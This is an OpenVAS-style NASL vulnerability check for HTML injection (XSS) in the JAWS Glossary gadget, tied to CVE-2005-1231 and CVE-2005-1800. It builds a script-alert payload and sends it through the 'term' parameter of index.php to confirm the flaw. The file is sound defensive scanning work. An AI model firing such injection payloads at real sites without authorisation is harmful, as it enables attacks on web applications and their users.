if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.19394" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_cve_id( "CVE-2005-1231", "CVE-2005-1800" );
	script_bugtraq_id( 13254, 13796 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "JAWS HTML injection vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2005 Josh Zlatin-Amishav" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "cross_site_scripting.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://seclists.org/lists/fulldisclosure/2005/Apr/0416.html" );
	script_xref( name: "URL", value: "http://lists.grok.org.uk/pipermail/full-disclosure/2005-May/034354.html" );
	script_tag( name: "solution", value: "Upgrade to JAWS 0.5.2 or later." );
	script_tag( name: "summary", value: "The remote version of JAWS does not perform a proper validation of
  user-supplied input to several variables used in the 'GlossaryModel.php' script, and is therefore
  vulnerable to cross-site scripting attacks." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("url_func.inc.sc");
require("misc_func.inc.sc");
vtstrings = get_vt_strings();
xss = "<script>alert('" + vtstrings["lowercase_rand"] + "');</script>";
exss = urlencode( str: xss );
exploits = make_list( NASLString( "gadget=Glossary&action=ViewTerm&term=",
	 exss ),
	 NASLString( "gadget=Glossary&action=view&term=",
	 exss ) );
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for exploit in exploits {
		url = NASLString( dir, "/index.php?", exploit );
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "Term does not exists" ) && ContainsString( res, xss )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

